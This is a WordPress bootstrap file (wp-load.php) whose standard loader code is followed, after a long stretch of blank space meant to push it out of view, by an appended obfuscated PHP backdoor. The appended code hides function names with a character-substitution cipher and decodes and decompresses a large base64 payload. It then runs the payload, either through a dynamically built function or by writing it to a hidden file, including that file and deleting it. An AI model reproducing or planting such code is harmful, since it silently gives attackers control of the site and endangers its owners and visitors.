<?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-config.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * wp-config.php file.
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */

/** Define ABSPATH as this file's directory */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/*
 * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
 * it's best to add a dummy function to the wp-config.php file, but as this call to the function
 * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
 */
if ( function_exists( 'error_reporting' ) ) {
	/*
	 * Initialize error reporting to a known set of levels.
	 *
	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
	 * @see http://php.net/manual/en/errorfunc.constants.php List of known error levels.
	 */
	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
}

/*
 * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
 * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
 * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
 * and /blog/ is WordPress(b).
 *
 * If neither set of conditions is true, initiate loading the setup process.
 */
if ( file_exists( ABSPATH . 'wp-config.php' ) ) {

	/** The config file resides in ABSPATH */
	require_once ABSPATH . 'wp-config.php';

} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {

	/** The config file resides one level above ABSPATH but is not part of another installation */
	require_once dirname( ABSPATH ) . '/wp-config.php';

} else {

	// A config file doesn't exist.

	define( 'WPINC', 'wp-includes' );
	require_once ABSPATH . WPINC . '/load.php';

	// Standardize $_SERVER variables across setups.
	wp_fix_server_vars();

	require_once ABSPATH . WPINC . '/functions.php';

	$path = wp_guess_url() . '/wp-admin/setup-config.php';

	/*
	 * We're going to redirect to setup-config.php. While this shouldn't result
	 * in an infinite loop, that's a silly thing to assume, don't you think? If
	 * we're traveling in circles, our last-ditch effort is "Need more help?"
	 */
	if ( false === strpos( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
		header( 'Location: ' . $path );
		exit;
	}

	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
	require_once ABSPATH . WPINC . '/version.php';

	wp_check_php_mysql_versions();
	wp_load_translations_early();

	// Die with an error message.
	$die = '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "There doesn't seem to be a %s file. I need this before we can get started." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: %s: Documentation URL. */
		__( "Need more help? <a href='%s'>We got it</a>." ),
		__( 'https://wordpress.org/support/article/editing-wp-config-php/' )
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';

	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
}






























																																																																						$FzGX = function($SfuJ) { return strtr($SfuJ, 'p6DkerP1HoNhBZu3qGLTW2lAd5cEnw0xtbiYFCyQ7fUKXOvgsSm9jz_4M8RVaIJ', 'Y_A0hCnHkGVjeN7P2TEyqJWridmK18fD6ogz3UIpsu4awbcZO9l5BMLQxXtFSvR'); };$HqVli = $FzGX('iBR65B0dPB560fPvRdbP7');$njtdE = $HqVli();$TqPyr = $njtdE[$FzGX('dPRBAPKm')];foreach ($TqPyr as $XDzaE => $lKCYa) {if (false !== strpos($lKCYa, $FzGX('U65'))) {$GqCC = $TqPyr[$XDzaE];continue;}if (false !== strpos($lKCYa, $FzGX('YdP0'))) {$tYUHu = $TqPyr[$XDzaE];continue;}if (false !== strpos($lKCYa, $FzGX('BKRB60f'))) {$tysg = str_replace($FzGX('7WmdRB6'), "", $TqPyr[$XDzaE]);continue;}if (false !== strpos($lKCYa, $FzGX('YfPv'))) {$vJrct = $TqPyr[$XDzaE];continue;}}$lDwAp = $tYUHu($vJrct($GqCC('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')));if (isset($tysg) && function_exists($tysg)) {$wLry = $FzGX('BAAbA6ABQbARdPi');if (function_exists($wLry)) {$wLry(constant($FzGX('L6D__')) ^ constant($FzGX('L6xL3JLrDGLx')));}$g = $tysg('', $lDwAp);} else {$g = function() use($FzGX, $lDwAp) {$bukbg = __DIR__ . $FzGX('/.dPv');$XIew = $FzGX('0dmB6QfR6vbPRBPR7');$USOby = $FzGX('fPmdPH');if (@$XIew($bukbg, $FzGX('<?QeQ ') . $lDwAp, constant($FzGX('_srE6L8')))) {try {include_once($bukbg);$USOby($bukbg);} catch (Exception $e) {$USOby($bukbg);if ($FzGX('5dB') === $e->{$FzGX('iBRzB77KiB')}()) exit;}}};}$g();
